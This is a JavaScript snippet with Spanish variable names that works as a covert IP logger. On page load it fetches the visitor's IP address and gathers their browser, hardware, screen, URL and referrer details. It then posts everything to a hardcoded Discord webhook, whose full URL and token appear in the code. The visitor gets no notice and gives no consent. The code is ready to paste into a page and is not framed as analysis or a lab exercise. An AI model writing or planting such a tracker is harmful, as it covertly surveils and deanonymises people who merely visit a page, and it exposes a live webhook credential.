<script>
async function obtenerIP() {
  try {
    const respuesta = await fetch('https://api.ipify.org?format=json');
    const datos = await respuesta.json();
    return datos.ip;
  } catch (error) {
    return 'No se pudo obtener IP';
  }
}

function obtenerInfoAvanzada() {
  return {
    userAgent: navigator.userAgent,
    idioma: navigator.language,
    plataforma: navigator.platform,
    cookies: navigator.cookieEnabled,
    hardware: {
      cpu: navigator.hardwareConcurrency || 'Desconocido',
      memoria: navigator.deviceMemory || 'Desconocido',
      touch: navigator.maxTouchPoints || 0
    },
    pantalla: {
      ancho: screen.width,
      alto: screen.height,
      color: screen.colorDepth
    },
    url: window.location.href,
    referrer: document.referrer
  };
}

async function enviarDatosDiscord() {
  const ip = await obtenerIP();
  const info = obtenerInfoAvanzada();

  const contenido = `
📡 IP: ${ip}
🌐 URL: ${info.url}
🔁 Referrer: ${info.referrer}
🧠 User-Agent: ${info.userAgent}
🗣️ Idioma: ${info.idioma}
💻 Plataforma: ${info.plataforma}
🍪 Cookies: ${info.cookies}
🧮 CPU: ${info.hardware.cpu}
📈 Memoria: ${info.hardware.memoria} GB
📱 Touch: ${info.hardware.touch}
🖥️ Resolución: ${info.pantalla.ancho}x${info.pantalla.alto} (${info.pantalla.color} bits)
🕒 Fecha: ${new Date().toLocaleString()}
`;

  fetch('https://discord.com/api/webhooks/1393779023548776591/tLNcOb11GsA956uIzaLifR7FUSvRlfYlnYDq2aiSdU0Ecwvl6gE7flf79MKQ123CnJVY', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: contenido })
  });
}

window.addEventListener('load', enviarDatosDiscord);
</script>
